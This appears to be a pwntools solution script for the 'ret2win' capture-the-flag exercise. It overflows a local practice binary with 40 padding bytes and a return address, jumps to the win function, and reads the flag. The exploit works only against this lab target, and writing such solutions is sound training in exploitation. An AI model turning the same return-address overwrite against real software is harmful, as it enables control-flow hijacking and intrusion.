import pwn
import logging


logging.basicConfig(
    level=logging.DEBUG,
    format= '[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

DEBUG = False 
BINARY = './ret2win'
GOAL_FUNCTION = 'ret2win'

GDB_SCRIPT = f'''
set pagination off
set disassembly-flavor intel

b *0x400769
commands 
printf "woot, reached goal address@@@@@@@@@@@@@@@@"
bt

end

c
'''


def set_properties(elf):
    pwn.context.bits = elf.bits
    pwn.context.endian = elf.endian
    pwn.context.arch = elf.arch
    pwn.context.log_level = 'info'


def create_shellcode():
    shellcode = b''
    shellcode += 40 * b'A'
    # Note - we skip the prolouge of the target function, as the extra 'push rbp' would make rsp un-aligned to 16 bytes.
    # This would cause system() to crash
    shellcode += pwn.p64(0x400764)

    logging.info(f'Created shellcode:\n{shellcode}')

    return shellcode


def exploit(p, shellcode):
    if DEBUG:
        pwn.gdb.attach(p, GDB_SCRIPT)

    p.sendline(shellcode)
    p.recvuntil('Thank you!')

    data = p.recvall()
    logger.info(f'FLAG:{data}')

    p.interactive()


def main():
    elf = pwn.ELF(BINARY)
    set_properties(elf)

    shellcode = create_shellcode()

    p = pwn.process(BINARY)

    exploit(p, shellcode)


if __name__ == '__main__':
    main()
